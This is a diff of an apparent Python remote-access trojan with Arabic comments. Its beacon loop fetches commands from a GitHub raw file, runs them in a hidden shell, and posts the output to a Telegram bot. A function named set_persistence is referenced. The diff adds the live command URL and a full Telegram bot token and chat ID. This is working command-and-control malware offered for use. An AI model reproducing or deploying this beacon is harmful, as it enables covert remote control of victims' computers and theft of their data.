@@ -34,7 +34,7 @@ def set_persistence():
 
 def beacon_logic():
     # رابط الأوامر الخاص بك على GitHub
-    CMD_URL = "https://raw.githubusercontent.com/b1do404/.../main/cmd.txt"
+    CMD_URL = "https://raw.githubusercontent.com/b1do404/My-Python-Practise/refs/heads/main/test/cmd.txt"
     while True:
         try:
             r = requests.get(CMD_URL, timeout=10)
@@ -42,7 +42,7 @@ def beacon_logic():
             if cmd != "sleep":
                 # تنفيذ الأمر وإرسال النتيجة لتليجرام
                 output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, startupinfo=si)
-                requests.post("https://api.telegram.org/bot8253181046.../sendMessage", 
+                requests.post("https://api.telegram.org/bot8253181046:AAGwhrXiZU02eCt54pAGwpKuxTkJ7t4YRRI/sendMessage", 
                               data={"chat_id": "6012820754", "text": output.decode()})
             time.sleep(30) # نبضة كل 30 ثانية
         except:
